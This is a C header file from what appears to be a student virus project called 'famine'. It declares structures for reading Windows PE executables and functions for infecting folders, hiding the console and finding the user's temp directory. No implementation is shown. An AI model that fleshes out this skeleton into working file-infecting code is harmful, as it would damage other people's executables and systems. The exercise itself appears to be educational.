/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   all.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/07/01 18:05:22 by frmarinh          #+#    #+#             */
/*   Updated: 2017/07/01 18:07:34 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef ALL_H
# define ALL_H

# include <stdio.h>
# include <locale.h>
# include <windows.h>
# include <dirent.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <unistd.h>
# include <fcntl.h>
# include <errno.h>
# include "../libft/includes/libft.h"

# define APP_ENV	"APPDATA"
# define TEMP_PATH	"\\Local\\Temp"
# define BACKSLASH	"\\"
# define DEBUG_MODE	"DEBUG"
# define bool		int
# define true		1
# define false		0
# define NO_FLAGS	0
# define EXIT_CODE	-1

typedef struct		s_pe
{
	char			*name;
	char			*path;
	int				len;
	char			*buffer;
}					t_pe;

typedef struct		s_famine
{
	char			*path;
	bool			debug;
}					t_famine;

/*
**	MAIN
*/
void				close_console();
void				start_debug_console();

/*
**	UTILS
*/
void				*ft_mmap(int fd, size_t size);
void				print_message(t_famine *famine, char *message, bool leave);

/*
**	FAMINE
*/
void				init_famine(int, char**);

/*
**	INFECTION
*/
void				infect_folder(t_famine *famine, char *folder_name);

/*
**	ACCESS FILE
*/
struct stat			*check_access_file(char *file, t_famine *famine);

/*
**	READ PE
*/
t_pe				*pe(t_famine *famine, char *folder_path, char *file_name);
#endif
